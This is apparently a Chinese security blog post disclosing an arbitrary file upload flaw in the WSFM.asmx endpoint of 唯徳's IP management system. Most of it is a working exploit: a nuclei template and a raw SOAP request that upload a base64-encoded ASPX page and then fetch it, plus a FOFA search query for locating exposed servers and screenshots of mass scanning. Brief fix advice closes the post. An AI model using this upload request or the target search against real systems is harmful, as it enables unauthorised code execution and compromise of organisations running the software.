#  唯徳知识产权管理系统WSFM.asmx接口处存在任意文件上传漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-22 00:32  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
唯徳知识产权管理系统WSFM.asmx接口处存在任意文件上传漏洞。  
攻击者可通过上传包含恶意代码的文件到服务器，使恶意文件被执行，从而导致系统被入侵或遭受其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: weidezhishichanquanguanlixitong-WSFM_asmx-fileupload

info:
  name: 唯徳知识产权管理系统WSFM.asmx接口处存在任意文件上传漏洞

  author: kingkong
  severity: high
  metadata:
    fofa-query: body="JSCOMM/language.js"

http:
  - raw:
      - |
        POST /AutoUpdate/WSFM.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: length
        SOAPAction: "http://tempuri.org/UploadFileWordTemplate"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadFileWordTemplate xmlns="http://tempuri.org/">
              <fileByteArray>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoMTExKjExMSk7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFNlcnZlci5NYXBQYXRoKFJlcXVlc3QuVXJsLkFic29sdXRlUGF0aCkpOyAlPgo=</fileByteArray>
              <remotePath>/TemplateFiles/test.aspx</remotePath>
            </UploadFileWordTemplate>
          </soap:Body>
        </soap:Envelope>


      - |
        GET /TemplateFiles/test.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_2,"12321")'
        condition: and

```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="JSCOMM/language.js"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187qZKiagicYBaRaa49lqXia77qB833e4pg5L4CqbdDibPbhVhmb1Fyh4rxJw/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187XU4hDmYRu6vpeZvfF50wUKIAdBKAUImWu0dHxQt1FVtBFJNKR6zLVA/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187jqGFGeu7Xwmck1xxoWtsfO8wDDazdiccuDLMhYTnNmuldCbslwRjOeg/640?wx_fmt=png&from=appmsg "")  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187f8ZDt78nO3gloVR2zfNT5bGJyaNvpyiboDqGgciaI7hpNURAlM7wtDuQ/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13_7) AppleWebKit/570.18 (KHTML, like Gecko) Version/13.0 Safari/570.18
Connection: close
Content-Length: 1147
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/UploadFileWordTemplate"
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFileWordTemplate xmlns="http://tempuri.org/">
      <fileByteArray>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoMTExKjExMSk7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFNlcnZlci5NYXBQYXRoKFJlcXVlc3QuVXJsLkFic29sdXRlUGF0aCkpOyAlPgo=</fileByteArray>
      <remotePath>/TemplateFiles/test.aspx</remotePath>
    </UploadFileWordTemplate>
  </soap:Body>
</soap:Envelope>


GET /TemplateFiles/test.aspx HTTP/1.1
Host:
```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187PqPfcoG73cictyKIu8B7ibBNIPCmib8PtYgLQCLA9quBQAaNhpMyLrGGg/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、文件类型验证：仅允许上传特定类型的文件，例如图像、文档等，并拒绝可执行文件或其他潜在的恶意文件类型。  
  
2、文件大小限制：限制上传文件的大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。  
  
3、文件名处理：对上传的文件进行重命名，避免使用用户提供的文件名，以防止路径遍历攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
  
